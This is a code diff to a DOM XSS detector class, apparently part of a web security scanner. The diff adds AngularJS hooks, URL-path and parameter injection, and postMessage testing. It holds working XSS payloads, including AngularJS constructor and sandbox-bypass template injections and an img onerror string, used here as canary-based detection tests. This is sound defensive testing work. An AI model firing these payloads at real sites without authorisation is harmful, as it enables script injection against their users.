@@ -73,13 +73,16 @@ class DOMXSSDetector:
         """
         TASK-55: Enhanced taint tracking for DOM XSS detection.
         Monitors dangerous sinks AND tracks tainted sources.
+
+        IMPROVED (2026-01-30): Added AngularJS-specific monitoring.
         """
         parts = [
             self._build_monitor_header(),
             self._build_source_tracking(),
             self._build_sink_monitoring(),
             self._build_jquery_hooks(),
-            "console.log('DOMXSS_MONITOR_INJECTED_V2');"
+            self._build_angular_hooks(),
+            "console.log('DOMXSS_MONITOR_INJECTED_V3');"
         ]
         return f"(function() {{ {' '.join(parts)} }})();"
 
@@ -280,10 +283,57 @@ class DOMXSSDetector:
             }
         """
 
+    def _build_angular_hooks(self) -> str:
+        """ADDED (2026-01-30): Build AngularJS-specific hooks for template execution detection."""
+        return """
+            if (window.angular) {
+                const CANARY = 'DOMXSS_CANARY_7x7';
+                // Monitor Angular template compilation
+                const originalCompile = angular.element.prototype.html;
+                if (originalCompile) {
+                    angular.element.prototype.html = function(value) {
+                        if (value && value.toString().includes(CANARY)) {
+                            window.__domxss_findings.push({
+                                sink: 'angular.element.html',
+                                value: value.toString().substring(0, 500),
+                                sources: [...window.__domxss_sources]
+                            });
+                            console.error('DOMXSS_DETECTED:angular.element.html:' + value.toString().substring(0, 200));
+                        }
+                        return originalCompile.apply(this, arguments);
+                    };
+                }
+                // Monitor $compile service if available
+                try {
+                    const injector = angular.element(document).injector();
+                    if (injector) {
+                        const originalCompileService = injector.get('$compile');
+                        if (originalCompileService) {
+                            injector.get('$rootScope').$watch(function() {
+                                const template = document.body.innerHTML;
+                                if (template.includes(CANARY) && template.includes('{{')) {
+                                    window.__domxss_findings.push({
+                                        sink: '$compile',
+                                        value: 'AngularJS template evaluation with user input',
+                                        sources: [...window.__domxss_sources]
+                                    });
+                                    console.error('DOMXSS_DETECTED:$compile:AngularJS');
+                                }
+                            });
+                        }
+                    }
+                } catch (e) {
+                    // Injector not ready yet
+                }
+            }
+        """
+
     def _get_dom_xss_payloads(self) -> List[Dict[str, str]]:
         """
         Returns payloads designed for DOM XSS detection.
         Each payload contains a canary that our hooks will detect.
+
+        IMPROVED (2026-01-30): Added AngularJS-specific payloads for ginandjuice.shop.
         """
         canary = "DOMXSS_CANARY_7x7"
 
@@ -297,24 +347,43 @@ class DOMXSSDetector:
             {"payload": f"'-alert('{canary}')-'", "type": "js_breakout_single"},
             {"payload": f'"-alert("{canary}")-"', "type": "js_breakout_double"},
             {"payload": f"</script><script>alert('{canary}')</script>", "type": "script_breakout"},
+            # ADDED (2026-01-30): AngularJS-specific payloads
+            {"payload": f"{{{{constructor.constructor('alert(\"{canary}\")')()}}}}", "type": "angular_constructor"},
+            {"payload": f"{{{{$on.constructor('alert(\"{canary}\")')()}}}}", "type": "angular_on"},
+            {"payload": f"{{{{['a]'constructor.prototype.charAt=[].join;$eval('x={canary}');'x'}}}}", "type": "angular_sandbox_bypass"},
         ]
 
     async def scan(self, url: str) -> List[DOMXSSFinding]:
-        """Scan a URL for DOM XSS vulnerabilities."""
+        """Scan a URL for DOM XSS vulnerabilities.
+
+        IMPROVED (2026-01-30): Added more sources and comprehensive testing.
+        """
         if not self.browser:
             await self.start()
 
         findings = []
         payloads = self._get_dom_xss_payloads()
-        sources = ["hash", "search"]
+        # IMPROVED: Test more injection points
+        sources = ["hash", "search", "path"]
 
         context, page = await self._setup_scan_context()
 
         try:
+            # Test standard sources
             for source in sources:
                 finding = await self._test_source(url, source, payloads, page)
                 if finding:
                     findings.append(finding)
+
+            # IMPROVED: Also test URL parameters directly if URL has params
+            param_findings = await self._test_url_parameters(url, payloads, page)
+            findings.extend(param_findings)
+
+            # IMPROVED: Test postMessage-based XSS
+            postmsg_finding = await self._test_postmessage_xss(url, page)
+            if postmsg_finding:
+                findings.append(postmsg_finding)
+
         except Exception as e:
             logger.error(f"[DOMXSSDetector] Scan error: {e}", exc_info=True)
         finally:
@@ -322,6 +391,67 @@ class DOMXSSDetector:
 
         self.findings.extend(findings)
         return findings
+
+    async def _test_url_parameters(self, url: str, payloads: List[Dict], page) -> List[DOMXSSFinding]:
+        """ADDED (2026-01-30): Test each URL parameter for DOM XSS."""
+        findings = []
+        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+
+        parsed = urlparse(url)
+        params = parse_qs(parsed.query)
+
+        if not params:
+            return findings
+
+        for param_name in params:
+            for p in payloads[:5]:  # Test first 5 payloads per param
+                payload = p["payload"]
+                test_params = {k: v[0] for k, v in params.items()}
+                test_params[param_name] = payload
+
+                test_url = urlunparse((
+                    parsed.scheme, parsed.netloc, parsed.path,
+                    parsed.params, urlencode(test_params), parsed.fragment
+                ))
+
+                finding = await self._test_payload(test_url, payload, f"param:{param_name}", page)
+                if finding:
+                    findings.append(finding)
+                    break  # Found XSS in this param, move to next
+
+        return findings
+
+    async def _test_postmessage_xss(self, url: str, page) -> Optional[DOMXSSFinding]:
+        """ADDED (2026-01-30): Test for postMessage-based DOM XSS."""
+        try:
+            await page.goto(url, wait_until="networkidle", timeout=self.timeout)
+
+            # Inject postMessage with XSS payload
+            canary = "DOMXSS_CANARY_7x7"
+            payload = f"<img src=x onerror=alert('{canary}')>"
+
+            result = await page.evaluate(f"""
+                () => {{
+                    return new Promise((resolve) => {{
+                        const payload = `{payload}`;
+                        window.postMessage(payload, '*');
+                        setTimeout(() => {{
+                            const findings = window.__domxss_findings || [];
+                            resolve(findings.length > 0 ? findings[0] : null);
+                        }}, 500);
+                    }});
+                }}
+            """)
+
+            if result:
+                return DOMXSSFinding(
+                    url=url, payload=payload, sink=result.get("sink", "postMessage"),
+                    source="window.postMessage", evidence=result.get("value", "postMessage XSS")
+                )
+        except Exception as e:
+            logger.debug(f"postMessage XSS test failed: {e}")
+
+        return None
 
     async def _setup_scan_context(self):
         """Setup browser context and page for scanning."""
@@ -342,11 +472,23 @@ class DOMXSSDetector:
         return None
 
     def _build_test_url(self, url: str, source: str, payload: str) -> str:
-        """Build test URL with payload in specified source."""
+        """Build test URL with payload in specified source.
+
+        IMPROVED (2026-01-30): Support path-based injection.
+        """
+        from urllib.parse import quote
+
         if source == "hash":
             return f"{url}#{payload}"
-        sep = "&" if "?" in url else "?"
-        return f"{url}{sep}xss={payload}"
+        elif source == "path":
+            # IMPROVED: Inject payload in path (some apps reflect path segments)
+            safe_payload = quote(payload, safe='')
+            if url.endswith('/'):
+                return f"{url}{safe_payload}"
+            return f"{url}/{safe_payload}"
+        else:  # search
+            sep = "&" if "?" in url else "?"
+            return f"{url}{sep}xss={payload}"
 
     async def _test_payload(self, test_url: str, payload: str, source: str, page) -> Optional[DOMXSSFinding]:
         """Test a single payload and check for XSS execution."""
